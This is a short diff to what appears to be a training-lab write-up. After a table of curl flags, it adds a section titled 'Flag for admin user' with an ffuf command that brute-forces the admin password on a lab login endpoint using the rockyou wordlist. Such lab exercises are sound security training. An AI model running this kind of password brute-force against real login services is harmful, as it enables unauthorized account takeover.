@@ -83,3 +83,15 @@ curl -s -X POST "WEBSITE_URL/api/check_username" \
 | `-H` | Adds HTTP headers |
 | `-d` | Sends POST body data |
 
+
+# Flag for admin user
+
+```bash
+ffuf \
+  -X POST \
+  -u https://web-80-1-157.cod-eu-west-3.hbtn.io/login \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin&password=FUZZ" \
+  -w /usr/share/wordlists/rockyou.txt \
+  -fc 401
+```
